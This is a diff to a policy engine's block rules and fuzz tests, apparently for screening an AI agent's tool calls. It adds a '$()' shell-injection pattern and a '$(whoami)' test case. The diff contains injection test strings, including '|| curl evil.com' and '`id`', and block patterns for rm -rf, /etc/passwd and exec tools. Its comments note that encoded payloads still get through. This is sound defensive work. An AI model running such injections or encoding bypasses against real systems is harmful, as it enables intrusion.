@@ -12,7 +12,7 @@ const BLOCKING_POLICY: PolicyConfig = {
   policy: {
     mode: 'block',
     rules: [
-      { name: 'shell-injection', action: 'block', patterns: ['rm\\s+-rf', 'curl\\s|wget\\s', ';\\s*\\w', '&&|\\|\\|', '`[^`]+`'] },
+      { name: 'shell-injection', action: 'block', patterns: ['rm\\s+-rf', 'curl\\s|wget\\s', ';\\s*\\w', '&&|\\|\\|', '`[^`]+`', '\\$\\([^)]+\\)'] },
       { name: 'path-traversal', action: 'block', patterns: ['\\.\\.\\/', '/etc/passwd', '/etc/shadow'] },
       { name: 'deny-dangerous', action: 'block', tools: { deny: ['execute_command', 'eval', 'bash', 'sh', 'exec'] } },
       { name: 'rate-limit', action: 'flag', maxCallsPerMinute: 100 },
@@ -32,7 +32,7 @@ describe('PolicyEngine Fuzz Tests', () => {
     '&& whoami',
     '|| curl evil.com',
     '`id`',
-    // KNOWN LIMITATION: $(whoami) not caught by current patterns (no $() pattern in default policy)
+    '$(whoami)',
     // KNOWN LIMITATION: hex-encoded and URL-encoded payloads not caught (no decoding layer)
     // These are documented in docs/THREAT_MODEL.md as accepted risks for v1.0
 
